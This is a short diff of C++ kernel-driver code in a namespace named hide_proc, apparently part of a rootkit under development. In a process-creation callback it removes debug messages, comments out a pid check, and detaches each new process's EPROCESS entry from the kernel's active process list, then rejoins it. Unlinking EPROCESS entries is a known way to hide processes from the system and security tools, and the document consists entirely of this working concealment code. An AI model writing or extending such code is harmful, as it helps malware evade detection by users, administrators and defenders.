@@ -171,7 +171,6 @@ namespace hide_proc
 	{
 		if (create_info) // Process creation
 		{
-			DebugMessage("Process creation");
 			if (create_info->ImageFileName == nullptr || create_info->FileOpenNameAvailable == FALSE)
 			{
 				return;
@@ -182,16 +181,19 @@ namespace hide_proc
 			{
 				process_image_name = &process_image_name[String<WCHAR>(L"\\??\\").Size()];
 			}
-			DebugMessage("Real %lld: %ws", pid, process_image_name.Data());
-
+			
 			size_t index = GetIndexInHiddenProcIdList(pid);
+			/*
+			if (index != -1)
+			{
+				AddPeprocessToHideList(eprocess);
+				(*kHideProcIdList)[index].DetachFromProcessList();
+			}
+			*/
 			AddPeprocessToHideList(eprocess);
 			(*kHideProcIdList)[(*kHideProcIdList).Size() - 1].DetachFromProcessList();
-			if ((*kHideProcIdList)[(*kHideProcIdList).Size() - 1].IsDetached())
-			{
-				DebugMessage("Detached!");
-			}
-			return;
+			(*kHideProcIdList)[(*kHideProcIdList).Size() - 1].JoinToProcessList();
+
 			index = GetIndexInHiddenProcImageList(&process_image_name);
 			if (index != -1)
 			{
